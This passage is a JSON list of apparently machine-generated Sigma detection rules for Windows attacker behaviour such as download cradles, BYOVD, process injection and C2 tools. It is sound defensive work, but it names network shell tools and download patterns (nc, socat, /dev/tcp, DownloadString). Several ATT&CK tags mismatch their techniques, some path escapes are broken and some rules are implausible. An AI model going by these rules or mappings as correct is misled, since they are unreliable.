            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": [
              "Invoke-WebRequest",
              "Invoke-RestMethod"
            ]
          },
          "selection3": {
            "Image|endswith": "\\cmd.exe",
            "CommandLine|contains": [
              "certutil",
              "http"
            ]
          },
          "condition": "selection1 or selection2 or selection3"
        },
        "falsepositives": [
          "Legitimate use of certutil for certificate management",
          "PowerShell scripts using Invoke-WebRequest for legitimate purposes"
        ],
        "level": "high",
        "tags": [
          "attack.privilege_escalation",
          "attack.t1567",
          "exploitation.for_privilege_escalation",
          "custom.sigma"
        ],
        "ttp_id": "unknown",
        "technique_name": "Exploitation for Privilege Escalation",
        "generation_method": "langchain",
        "id": "b965a7c9-cf83-4a0a-ac70-9157123b9d43"
      },
      {
        "title": "Disable or Evade Security Tools via BYOVD",
        "description": "Detects the exploitation of a vulnerable driver kernel module using the BYOVD technique to defeat security products",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection1": {
            "Image|endswith": "\\sysmon.exe",
            "CommandLine|contains": "BYOVD"
          },
          "selection2": {
            "Image|endswith": "\\csrss.exe",
            "CommandLine|contains": "vulnerable driver kernel module"
          },
          "condition": "selection1 or selection2"
        },
        "falsepositives": [
          "Legitimate system administration tasks",
          "False positives may occur due to similar command line arguments used by legitimate system processes"
        ],
        "level": "high",
        "tags": [
          "attack.defense_evasion",
          "attack.t1562",
          "custom.BYOVD",
          "custom.vulnerable driver kernel module"
        ],
        "ttp_id": "unknown",
        "technique_name": "Disable or Evade Security Tools",
        "generation_method": "langchain",
        "id": "ff9088b9-175d-4f7e-a549-fc9f93d0d214"
      },
      {
        "title": "Exploitation of Public-Facing Application",
        "description": "Detects exploitation of public certificate software vulnerability",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection1": {
            "Image|endswith": "\rundll32.exe",
            "CommandLine|contains": ".dll"
          },
          "selection2": {
            "Image|endswith": "\regsvr32.exe",
            "CommandLine|contains": "http://"
          },
          "selection3": {
            "Image|endswith": "\\msiexec.exe",
            "CommandLine|contains": "/quiet"
          },
          "condition": "selection1 or selection2 or selection3"
        },
        "falsepositives": [
          "Legitimate software installations",
          "System updates"
        ],
        "level": "high",
        "tags": [
          "attack.initial_access",
          "attack.t1566",
          "exploitation.of.public-facing.application"
        ],
        "ttp_id": "unknown",
        "technique_name": "Exploitation of Public-Facing Application",
        "generation_method": "langchain",
        "id": "fa16c117-c3b8-49fc-9c19-a2f3decb052a"
      },
      {
        "title": "Masquerading as System File",
        "description": "Detects masquerading as system file by using the same file name as the system file name",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_system_file": {
            "Image|endswith": [
              "\\cmd.exe",
              "\\powershell.exe",
              "\\cscript.exe",
              "\\wscript.exe"
            ]
          },
          "selection_masquerade": {
            "Image|startswith": "C:\\Windows\\"
          },
          "condition": "selection_system_file and selection_masquerade"
        },
        "falsepositives": [
          "Legitimate system file execution",
          "Administrative tasks"
        ],
        "level": "medium",
        "tags": [
          "attack.defense_evasion",
          "attack.t1564.003",
          "custom.masquerading"
        ],
        "ttp_id": "unknown",
        "technique_name": "Masquerading",
        "generation_method": "langchain",
        "id": "c4d8383d-72ae-487d-b618-dabb05976324"
      },
      {
        "title": "Exploitation for Client Execution via Certificate Software Vulnerability",
        "description": "Detects exploitation of certificate software vulnerabilities for client execution",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection1": {
            "Image|endswith": "\\svchost.exe",
            "ParentImage|endswith": "\ftp.exe"
          },
          "selection2": {
            "Image|endswith": "\ftp.exe",
            "CommandLine|contains": [
              "-v",
              "-s"
            ]
          },
          "selection3": {
            "Image|endswith": "\\AppCrash.exe"
          },
          "condition": "selection1 or selection2 or selection3"
        },
        "falsepositives": [
          "Legitimate system administration tasks",
          "Software updates or installations"
        ],
        "level": "high",
        "tags": [
          "attack.execution",
          "attack.t1569",
          "custom.exploitation",
          "custom.certificate software vulnerability"
        ],
        "ttp_id": "unknown",
        "technique_name": "Exploitation for Client Execution",
        "generation_method": "langchain",
        "id": "c2e9f729-84b8-4bfb-8db4-7dc19e06cfac"
      },
      {
        "title": "Indicator Removal via Prefetch and Crash Dump File Deletion",
        "description": "Detects deletion of Prefetch files and crash dump files to evade detection",
        "logsource": {
          "category": "file_event",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_prefetch_deletion": {
            "TargetFilename|endswith": ".pf",
            "EventID": "23"
          },
          "selection_crash_dump_deletion": {
            "TargetFilename|endswith": ".dmp",
            "EventID": "23"
          },
          "condition": "selection_prefetch_deletion or selection_crash_dump_deletion"
        },
        "falsepositives": [
          "legitimate system file cleanup",
          "disk space management"
        ],
        "level": "medium",
        "tags": [
          "attack.defense_evasion",
          "attack.t1565",
          "attack.indicator_removal"
        ],
        "ttp_id": "unknown",
        "technique_name": "Indicator Removal",
        "generation_method": "langchain",
        "id": "3752b7e7-e6d2-4aaa-8dda-8a4c4a4be6c8"
      },
      {
        "title": "Indicator Removal via Suspicious Process Creation",
        "description": "Detects deletion of malicious files by suspicious processes",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_file_deletion": {
            "Image|endswith": [
              "\\cmd.exe",
              "\\powershell.exe"
            ],
            "CommandLine|contains": [
              "del",
              "rm",
              "erase"
            ]
          },
          "selection_suspicious_processes": {
            "Image|endswith": [
              "\\sfbappsdk.dll",
              "\fswss.exe",
              "\fmSysN.exe",
              "\\skypeserver.exe",
              "\\perlcritic.exe",
              "\\perlcritic64.exe"
            ]
          },
          "condition": "selection_file_deletion and selection_suspicious_processes"
        },
        "falsepositives": [
          "Legitimate file deletion by system administrators",
          "False positives from antivirus software"
        ],
        "level": "high",
        "tags": [
          "attack.defense_evasion",
          "attack.t1562",
          "attack.indicator_removal"
        ],
        "ttp_id": "unknown",
        "technique_name": "Indicator Removal",
        "generation_method": "langchain",
        "id": "d9acf33b-93dd-4cfa-acfb-a7fc1898b997"
      },
      {
        "title": "Exploitation of Remote Services via Certificate Software Vulnerability",
        "description": "Detects exploitation of certificate software vulnerabilities for lateral movement",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection1": {
            "Image|endswith": "\\svchost.exe",
            "ParentImage|endswith": "\\services.exe"
          },
          "selection2": {
            "Image|endswith": "\\svchost.exe",
            "CommandLine|contains": [
              "-k",
              "netsvcs"
            ]
          },
          "condition": "selection1 or selection2"
        },
        "falsepositives": [
          "Legitimate system services",
          "System updates or maintenance tasks"
        ],
        "level": "high",
        "tags": [
          "attack.lateral_movement",
          "attack.t1569",
          "custom.exploitation_of_remote_services"
        ],
        "ttp_id": "unknown",
        "technique_name": "Exploitation of Remote Services",
        "generation_method": "langchain",
        "id": "0446d526-f451-4f57-a0dd-940852428bec"
      },
      {
        "title": "Web Service Exploitation via Legitimate Domains",
        "description": "Detects potential web service exploitation using legitimate domains as C2 servers",
        "logsource": {
          "category": "network_connection",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_http": {
            "DestinationPort": 80,
            "UserAgent|contains": [
              "Mozilla/",
              "Chrome/",
              "Safari/"
            ]
          },
          "selection_https": {
            "DestinationPort": 443,
            "UserAgent|contains": [
              "Mozilla/",
              "Chrome/",
              "Safari/"
            ]
          },
          "selection_powershell": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": [
              "Invoke-WebRequest",
              "-Uri"
            ]
          },
          "selection_cmd": {
            "Image|endswith": "\\cmd.exe",
            "CommandLine|contains": [
              "curl",
              "wget"
            ]
          },
          "condition": "selection_http or selection_https or selection_powershell or selection_cmd"
        },
        "falsepositives": [
          "Legitimate web browsing traffic",
          "Software updates"
        ],
        "level": "medium",
        "tags": [
          "attack.command_and_control",
          "attack.t1566",
          "attack.web_service_exploitation"
        ],
        "ttp_id": "unknown",
        "technique_name": "Web Service Exploitation",
        "generation_method": "langchain",
        "id": "c5442cec-9d6f-447e-9e34-f8f3f75fb170"
      },
      {
        "title": "File Deletion via System Commands",
        "description": "Detects file deletion using system commands to evade detection",
        "logsource": {
          "category": "file_event",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_delete_file": {
            "Image|endswith": [
              "\\cmd.exe",
              "\\powershell.exe"
            ],
            "CommandLine|contains": [
              "del",
              "rm",
              "erase"
            ]
          },
          "selection_rename_file": {
            "Image|endswith": [
              "\\cmd.exe",
              "\\powershell.exe"
            ],
            "CommandLine|contains": [
              "ren",
              "rename-item"
            ]
          },
          "condition": "selection_delete_file or selection_rename_file"
        },
        "falsepositives": [
          "legitimate file deletion by system administrators",
          "file deletion by backup software"
        ],
        "level": "medium",
        "tags": [
          "attack.defense_evasion",
          "attack.t1565",
          "custom.mitre_file_deletion"
        ],
        "ttp_id": "unknown",
        "technique_name": "File Deletion",
        "generation_method": "langchain",
        "id": "c6d7771d-6962-4716-aaac-c4eb58f4c26e"
      },
      {
        "title": "Software Deployment Tools Detection",
        "description": "Detects potential software deployment tools used for loader and malware deployment",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection1": {
            "Image|endswith": "\\cmd.exe",
            "ParentImage|endswith": "\\explorer.exe"
          },
          "selection2": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": "Invoke-WebRequest"
          },
          "selection3": {
            "Image|endswith": "\rundll32.exe",
            "CommandLine|contains": "conti"
          },
          "selection4": {
            "Image|endswith": "\\loader.exe",
            "CommandLine|contains": "malware"
          },
          "condition": "selection1 or selection2 or selection3 or selection4"
        },
        "falsepositives": [
          "Legitimate software deployment tools",
          "Administrative tasks"
        ],
        "level": "high",
        "tags": [
          "attack.execution",
          "attack.t1566",
          "custom.conti",
          "custom.loader",
          "custom.malware"
        ],
        "ttp_id": "unknown",
        "technique_name": "Software Deployment Tools",
        "generation_method": "langchain",
        "id": "3c72acb8-ad8b-40fb-acc7-759f7d230928"
      },
      {
        "title": "Application Layer Protocol for C2 Communication",
        "description": "Detects the use of web protocols for C2 communication",
        "logsource": {
          "category": "network_connection",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_http": {
            "DestinationPort": 80,
            "Protocol": "http"
          },
          "selection_https": {
            "DestinationPort": 443,
            "Protocol": "https"
          },
          "selection_powershell": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": [
              "Invoke-WebRequest",
              "Invoke-RestMethod"
            ]
          },
          "selection_certutil": {
            "Image|endswith": "\\certutil.exe",
            "CommandLine|contains": [
              "-urlcache",
              "-f"
            ]
          },
          "condition": "selection_http or selection_https or (selection_powershell and (selection_http or selection_https)) or (selection_certutil and (selection_http or selection_https))"
        },
        "falsepositives": [
          "legitimate web traffic",
          "software updates"
        ],
        "level": "medium",
        "tags": [
          "attack.t1567",
          "attack.command_and_control"
        ],
        "ttp_id": "unknown",
        "technique_name": "Application Layer Protocol",
        "generation_method": "langchain",
        "id": "7b35e27f-6278-4f97-8236-cb6652038b37"
      },
      {
        "title": "Command and Scripting Interpreter via cmd.exe",
        "description": "Detects the use of Windows Command Shell to run perlcritic.exe",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_cmd": {
            "Image|endswith": "\\cmd.exe",
            "CommandLine|contains": "perlcritic.exe"
          },
          "condition": "selection_cmd"
        },
        "falsepositives": [
          "Legitimate use of perlcritic.exe by developers",
          "False positives may occur if perlcritic.exe is used in a non-malicious context"
        ],
        "level": "medium",
        "tags": [
          "attack.execution",
          "attack.t1569",
          "custom.mitre_command_and_scripting_interpreter"
        ],
        "ttp_id": "unknown",
        "technique_name": "Command and Scripting Interpreter",
        "generation_method": "langchain",
        "id": "9dbf825c-a621-4508-a63e-46fff31a71db"
      },
      {
        "title": "Exploitation for Privilege Escalation via PROCEXP152.sys",
        "description": "Detects the use of PROCEXP152.sys for privilege escalation",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection1": {
            "Image|endswith": "\\System",
            "CommandLine|contains": "PROCEXP152.sys"
          },
          "selection2": {
            "Image|endswith": "\\svchost.exe",
            "CommandLine|contains": "PROCEXP152.sys"
          },
          "condition": "selection1 or selection2"
        },
        "falsepositives": [
          "Legitimate system processes",
          "System administrator activities"
        ],
        "level": "high",
        "tags": [
          "attack.privilege_escalation",
          "attack.t1565",
          "custom.sigma"
        ],
        "ttp_id": "unknown",
        "technique_name": "Exploitation for Privilege Escalation",
        "generation_method": "langchain",
        "id": "20663336-a275-42ee-9d55-4591acb3d294"
      },
      {
        "title": "Network Service Discovery via fswss.exe",
        "description": "Detects the use of fswss.exe for network service discovery, which may indicate adversary use of this tool for reconnaissance purposes within a network.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection": {
            "Image|endswith": "\\fswss.exe"
          },
          "condition": "selection"
        },
        "falsepositives": [
          "Legitimate administrative use of fswss.exe for network scanning or diagnostics by system administrators"
        ],
        "level": "high",
        "tags": [
          "attack.discovery",
          "attack.T1046"
        ],
        "ttp_id": "unknown",
        "technique_name": "Network Service Discovery",
        "generation_method": "langchain",
        "id": "49a3d031-813e-46fa-9289-9206f0223ad4"
      },
      {
        "title": "Create or Modify System Process via Command Line or Script",
        "description": "Detects creation or modification of system processes using command-line tools or scripting engines, which may indicate adversary persistence through system process manipulation. Detection based on behavioral patterns associated with process creation via suspicious command-line arguments or parent-child process relationships.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_cmd": {
            "Image|endswith": "\\cmd.exe",
            "CommandLine|contains": [
              "/c",
              "/k",
              "start",
              "net start"
            ]
          },
          "selection_powershell": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": [
              "-exec",
              "-encode",
              "-c",
              "Start-Process",
              "New-Service",
              "sc.exe",
              "wmic.exe"
            ]
          },
          "selection_wmic": {
            "Image|endswith": "\\wmic.exe",
            "CommandLine|contains": [
              "process",
              "call",
              "create"
            ]
          },
          "selection_sc": {
            "Image|endswith": "\\sc.exe",
            "CommandLine|contains": [
              "create",
              "config",
              "binpath",
              "start="
            ]
          },
          "selection_schtasks": {
            "Image|endswith": "\\schtasks.exe",
            "CommandLine|contains": [
              "/create",
              "/sc",
              "/tr"
            ]
          },
          "condition": "selection_cmd or selection_powershell or selection_wmic or selection_sc or selection_schtasks"
        },
        "falsepositives": [
          "Administrative use of sc.exe, schtasks.exe, or wmic.exe for legitimate service or task management",
          "Automated scripts or configuration management tools (e.g., Ansible, Puppet) modifying system services",
          "Software installers registering services during setup"
        ],
        "level": "high",
        "tags": [
          "attack.t1053",
          "attack.t1543.003",
          "attack.t1126",
          "attack.t1037",
          "attack.g0004",
          "detection.rule.suspicious.process.creation"
        ],
        "ttp_id": "unknown",
        "technique_name": "Create or Modify System Process",
        "generation_method": "langchain",
        "id": "623fffc1-cb17-4835-8700-1f149fa5ccda"
      },
      {
        "title": "V3 Security Product Impairment via Malicious Process",
        "description": "Detects attempts to disable or modify the V3 security product using known malicious indicators associated with Exploit/Win.Lazardoor.GEN. Focuses on process creation events with suspicious command-line patterns indicative of defense evasion.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_v3_disable": {
            "CommandLine|contains": [
              "V3",
              "disable"
            ],
            "CommandLine|icontains": [
              "exploit",
              "lazardoor"
            ]
          },
          "selection_malware_process": {
            "Image|endswith": [
              "\\cmd.exe",
              "\\powershell.exe",
              "\\wscript.exe",
              "\\cscript.exe"
            ],
            "CommandLine|contains": [
              "Exploit/Win.Lazardoor.GEN"
            ]
          },
          "selection_suspicious_script": {
            "ParentImage|endswith": [
              "\\wscript.exe",
              "\\cscript.exe",
              "\\mshta.exe"
            ],
            "Image|endswith": [
              "\\cmd.exe",
              "\\powershell.exe"
            ]
          },
          "condition": "selection_v3_disable or selection_malware_process or selection_suspicious_script"
        },
        "falsepositives": [
          "Legitimate administrative scripts that reference 'V3' in comments or variables (unlikely but possible)",
          "Authorized security tooling interacting with V3 services (should be monitored separately)",
          "Test scripts in development environments containing malware-like strings"
        ],
        "level": "critical",
        "tags": [
          "attack.defense-evasion",
          "attack.T1562",
          "malware.exploit",
          "gen.lazardoor"
        ],
        "ttp_id": "unknown",
        "technique_name": "Impair Defenses",
        "generation_method": "langchain",
        "id": "df8a4fd3-b9a9-4ed6-83b4-991d20db7d88"
      },
      {
        "title": "Detected Process Injection Activity via Suspicious Parent-Child Process Relationships",
        "description": "Detects potential process injection by identifying suspicious parent-child process relationships and command-line patterns commonly associated with process injection techniques. Focuses on known malicious behaviors such as reflective loading, direct system calls, and process hollowing.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_suspicious_spawn": {
            "ParentImage|endswith": [
              "\\lsass.exe",
              "\\csrss.exe",
              "\\wininit.exe",
              "\\services.exe"
            ],
            "Image|endswith": [
              "\\cmd.exe",
              "\\powershell.exe",
              "\\wscript.exe",
              "\\cscript.exe",
              "\rundll32.exe",
              "\\mshta.exe",
              "\regsvr32.exe",
              "\\certutil.exe",
              "\bitsadmin.exe"
            ],
            "CommandLine|contains": [
              "-enc",
              "Base64",
              "Invoke-",
              "Reflective",
              "Shellcode",
              "VirtualAlloc",
              "WriteProcessMemory",
              "CreateRemoteThread",
              "NtWriteVirtualMemory",
              "NtMapViewOfSection"
            ]
          },
          "selection_suspicious_execution": {
            "Image|endswith": [
              "\rundll32.exe",
              "\\mshta.exe",
              "\regsvr32.exe"
            ],
            "CommandLine|contains": [
              "javascript:",
              "data:",
              "eval",
              "Base64",
              "-enc",
              "Reflective",
              "Shellcode"
            ]
          },
          "selection_suspicious_tools": {
            "CommandLine|contains": [
              "--inject",
              "/inject",
              "--processinject",
              "ProcessHollowing",
              "QueueApc",
              "SetContext"
            ]
          },
          "condition": "selection_suspicious_spawn or selection_suspicious_execution or selection_suspicious_tools"
        },
        "falsepositives": [
          "Legitimate administrative scripts using Base64-encoded commands",
          "Software deployment tools spawning scripts from system processes",
          "Penetration testing tools performing authorized injections"
        ],
        "level": "high",
        "tags": [
          "attack.defense_evasion",
          "attack.t1055",
          "detection.suspicious_parent_child",
          "technique.process_injection"
        ],
        "ttp_id": "unknown",
        "technique_name": "Process Injection",
        "generation_method": "langchain",
        "id": "749af810-e9ee-4260-b280-3e46c1deb798"
      },
      {
        "title": "Application Layer Protocol Activity via NLP Pattern Matching",
        "description": "Detects Application Layer Protocol activity using behavioral patterns and command-line indicators commonly seen in C2 communications. Detection focuses on known tools and command-line arguments associated with data exfiltration or C2 traffic over common application protocols (HTTP, HTTPS, DNS).",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_cmd": {
            "Image|endswith": "\\cmd.exe",
            "CommandLine|contains": [
              "/c",
              "start",
              "echo",
              ">",
              ">>"
            ]
          },
          "selection_powershell": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": [
              "Invoke-WebRequest",
              "-enc",
              "Out-File",
              "System.Net.WebClient",
              "Invoke-RestMethod",
              "DownloadString",
              "DownloadFile"
            ]
          },
          "selection_certutil": {
            "Image|endswith": "\\certutil.exe",
            "CommandLine|contains": [
              "-decode",
              "-encode",
              "-urlcache",
              "-f"
            ]
          },
          "selection_bitsadmin": {
            "Image|endswith": "\\bitsadmin.exe",
            "CommandLine|contains": [
              "/transfer",
              "http",
              "https"
            ]
          },
          "selection_ftp": {
            "Image|endswith": "\\ftp.exe",
            "CommandLine|contains": [
              "-s",
              "-n",
              "put",
              "get"
            ]
          },
          "selection_curl": {
            "Image|endswith": "\\curl.exe",
            "CommandLine|contains": [
              "http",
              "https",
              "-X",
              "POST",
              "-d",
              "--data"
            ]
          },
          "selection_wget": {
            "Image|endswith": "\\wget.exe",
            "CommandLine|contains": [
              "http",
              "https",
              "-O",
              "--post-data"
            ]
          },
          "condition": "selection_cmd or selection_powershell or selection_certutil or selection_bitsadmin or selection_ftp or selection_curl or selection_wget"
        },
        "falsepositives": [
          "Legitimate administrative scripts using PowerShell or command-line tools for configuration or file transfer",
          "Software deployment processes using BITSAdmin or certutil for legitimate downloads",
          "Automated backup or sync scripts transferring data over HTTP/HTTPS",
          "Developer tools invoking curl/wget for dependency retrieval"
        ],
        "level": "high",
        "tags": [
          "attack.t1071",
          "attack.command-and-control",
          "detection.emerging",
          "behavior.process.creation",
          "protocol.http",
          "protocol.https",
          "protocol.ftp"
        ],
        "ttp_id": "unknown",
        "technique_name": "Application Layer Protocol",
        "generation_method": "langchain",
        "id": "b1b6c617-82dc-4365-be1c-5d16ee76fb1a"
      },
      {
        "title": "Command and Scripting Interpreter Activity via Behavioral Patterns",
        "description": "Detected Command and Scripting Interpreter activity using behavioral command-line patterns indicative of malicious scripting execution. Covers common obfuscation and execution techniques in Windows environments.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_powershell": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": [
              "-enc",
              "-encodedcommand",
              "IEX",
              "Invoke-Expression",
              "DownloadString",
              "WebClient",
              "-nop",
              "-noni"
            ]
          },
          "selection_cmd": {
            "Image|endswith": "\\cmd.exe",
            "CommandLine|contains": [
              "/c",
              "start",
              "echo",
              ">",
              ">>",
              "certutil",
              "bitsadmin",
              "reg",
              "wmic",
              "ping",
              "nslookup"
            ]
          },
          "selection_wmic": {
            "Image|endswith": "\\wmic.exe",
            "CommandLine|contains": [
              "process",
              "call",
              "create"
            ]
          },
          "selection_cscript_wscript": {
            "Image|endswith": [
              "\\cscript.exe",
              "\\wscript.exe"
            ],
            "CommandLine|contains": [
              ".vbs",
              ".js",
              "//"
            ]
          },
          "selection_bash": {
            "Image|endswith": [
              "\\bash.exe",
              "\\sh.exe"
            ],
            "CommandLine|contains": [
              "-c",
              "/dev/tcp",
              "exec",
              "socat"
            ]
          },
          "condition": "selection_powershell or selection_cmd or selection_wmic or selection_cscript_wscript or selection_bash"
        },
        "falsepositives": [
          "Legitimate administrative scripting via PowerShell, cmd.exe, or WMIC",
          "Software deployment and patch management tools",
          "User running local development scripts",
          "Scheduled tasks executing maintenance scripts"
        ],
        "level": "high",
        "tags": [
          "attack.execution",
          "attack.t1059",
          "detection.emulation",
          "custom.windows",
          "custom.scripting"
        ],
        "ttp_id": "unknown",
        "technique_name": "Command and Scripting Interpreter",
        "generation_method": "langchain",
        "id": "ee9e67e9-5011-447e-b5b1-fed29853785e"
      },
      {
        "title": "C2 Communication via Command-Line Tools",
        "description": "Detects potential C2 communication by identifying suspicious command-line activity indicative of data exfiltration or remote command execution using common tools.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_cmd": {
            "Image|endswith": "\\cmd.exe",
            "CommandLine|contains": [
              "/c",
              "start",
              "echo",
              ">",
              ">>"
            ]
          },
          "selection_powershell": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": [
              "Invoke-WebRequest",
              "-enc",
              "Out-File",
              "System.Net.WebClient",
              "Invoke-RestMethod",
              "DownloadString",
              "DownloadFile"
            ]
          },
          "selection_certutil": {
            "Image|endswith": "\\certutil.exe",
            "CommandLine|contains": [
              "-decode",
              "-encode",
              "-urlcache"
            ]
          },
          "selection_bitsadmin": {
            "Image|endswith": "\\bitsadmin.exe",
            "CommandLine|contains": [
              "/transfer",
              "http"
            ]
          },
          "selection_wget_curl": {
            "Image|endswith": [
              "\\wget.exe",
              "\\curl.exe"
            ],
            "CommandLine|contains": [
              "http",
              "https",
              "-O",
              "--output"
            ]
          },
          "condition": "selection_cmd or selection_powershell or selection_certutil or selection_bitsadmin or selection_wget_curl"
        },
        "falsepositives": [
          "Legitimate administrative scripts using command-line tools for file download or execution",
          "Software deployment or patch management tools using bitsadmin or certutil",
          "PowerShell scripts for configuration management or monitoring",
          "Developer tools using curl or wget for dependency fetching"
        ],
        "level": "high",
        "tags": [
          "attack.t1071",
          "attack.t1047",
          "attack.t1105",
          "attack.t1132",
          "attack.t1027",
          "attack.c2"
        ],
        "ttp_id": "unknown",
        "technique_name": "Command and Control",
        "generation_method": "langchain",
        "id": "6f3caf92-b1ce-482a-93e7-f61a87db01f1"
      },
      {
        "title": "Exploit Public-Facing Application via NLP Pattern Matching",
        "description": "Detected Exploit Public-Facing Application activity via NLP pattern matching",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_exploit_keywords": {
            "CommandLine|contains": [
              "exploit",
              "payload",
              "shellcode",
              "reverse_tcp",
              "bind_shell",
              "msfvenom"
            ]
          },
          "selection_suspicious_tools": {
            "Image|endswith": [
              "\\python.exe",
              "\\perl.exe",
              "\\php.exe",
              "\ruby.exe",
              "\bash.exe",
              "\\sh.exe"
            ]
          },
          "selection_network_connection": {
            "CommandLine|contains": [
              "nc",
              "netcat",
              "socat",
              "telnet",
              "curl",
              "wget"
            ]
          },
          "selection_script_execution": {
            "CommandLine|contains": [
              ".py",
              ".pl",
              ".php",
              ".rb",
              ".sh",
              ".bash"
            ]
          },
          "condition": "selection_exploit_keywords and (selection_suspicious_tools or selection_network_connection or selection_script_execution)"
        },
        "falsepositives": [
          "Legitimate penetration testing activities",
          "Security research tools in use",
          "Administrative scripting involving common interpreters",
          "Development work with scripting languages on servers"
        ],
        "level": "high",
        "tags": [
          "attack.initial-access",
          "attack.T1190"
        ],
        "ttp_id": "unknown",
        "technique_name": "Exploit Public-Facing Application",
        "generation_method": "langchain",
        "id": "0a901713-9601-4eeb-8ff7-11262bb128d2"
      },
      {
        "title": "Network Service Discovery via Command Line Tools",
        "description": "Detected Network Service Discovery activity via NLP pattern matching and known command line tools used for scanning and enumeration.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_netstat": {
            "Image|endswith": "\\netstat.exe",
            "CommandLine|contains": [
              "-an",
              "-b",
              "-o"
            ]
          },
          "selection_nmap": {
            "Image|endswith": [
              "\\nmap.exe",
              "\\nmap"
            ],
            "CommandLine|contains": [
              "-sS",
              "-sT",
              "-sU",
              "-p",
              "--top-ports"
            ]
          },
          "selection_tcpview": {
            "Image|endswith": "\\tcpview.exe",
            "CommandLine|contains": [
              "-a",
              "-c"
            ]
          },
          "selection_ps_tcp": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": [
              "Get-NetTCPConnection",
              "Get-NetUDPEndpoint",
              "-ComputerName",
              "-Class"
            ]
          },
          "selection_portscan_utilities": {
            "Image|endswith": [
              "\\portqry.exe",
              "\\portqueryv2.exe",
              "\\angrypecker.exe"
            ]
          },
          "selection_ss": {
            "Image|endswith": "\\ss.exe",
            "CommandLine|contains": [
              "-tuln",
              "-l"
            ]
          },
          "selection_lsof": {
            "Image|endswith": "\\lsof",
            "CommandLine|contains": [
              "-i",
              ":LISTEN",
              ":ESTABLISHED"
            ]
          },
          "condition": "selection_netstat or selection_nmap or selection_tcpview or selection_ps_tcp or selection_portscan_utilities or selection_ss or selection_lsof"
        },
        "falsepositives": [
          "Legitimate network troubleshooting by system administrators",
          "Automated network monitoring tools",
          "Penetration testing activities within authorized scope"
        ],
        "level": "high",
        "tags": [
          "attack.discovery",
          "attack.T1046",
          "detection.emerging",
          "custom.windows",
          "custom.command_line",
          "custom.network_discovery"
        ],
        "ttp_id": "unknown",
        "technique_name": "Network Service Discovery",
        "generation_method": "langchain",
        "id": "dd62fc6e-fa4e-45bd-bb62-9cc55d1aec54"
      },
      {
        "title": "Archive Collected Data via Command-Line Archiving Tools",
        "description": "Detects archiving of collected data using command-line tools such as PowerShell Compress-Archive, 7-Zip, or other common archiving utilities. This behavior is often observed during the Collection phase of an attack where data is compressed before exfiltration.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_powershell": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": [
              "Compress-Archive",
              "7z a",
              "-archive",
              "& { Add-Type",
              "System.IO.Compression.ZipFile"
            ]
          },
          "selection_cmd_7zip": {
            "Image|endswith": "\\cmd.exe",
            "CommandLine|contains": [
              "7z a",
              "zip",
              "compress",
              "tar -czf"
            ]
          },
          "selection_wmic": {
            "Image|endswith": "\\wmic.exe",
            "CommandLine|contains": [
              "/output",
              "format:rawxml"
            ]
          },
          "selection_archive_utils": {
            "Image|endswith": [
              "\\7z.exe",
              "\\rar.exe",
              "\\zip.exe",
              "\\tar.exe"
            ],
            "CommandLine|contains": [
              "-r",
              "--recurse",
              "*.zip",
              "*.rar",
              "*.7z",
              "*.tar.gz"
            ]
          },
          "condition": "selection_powershell or selection_cmd_7zip or selection_wmic or selection_archive_utils"
        },
        "falsepositives": [
          "Legitimate administrative scripts using PowerShell Compress-Archive or 7-Zip for backup purposes",
          "System maintenance tasks that archive logs or temporary files",
          "Software deployment processes that package files before distribution"
        ],
        "level": "high",
        "tags": [
          "attack.collection",
          "attack.T1560",
          "detection.emerging",
          "custom.windows",
          "custom.sysmon"
        ],
        "ttp_id": "unknown",
        "technique_name": "Archive Collected Data",
        "generation_method": "langchain",
        "id": "8b113719-9de4-4b92-a024-7e1b2073d402"
      },
      {
        "title": "Timestomping Detection via File Attribute Modification",
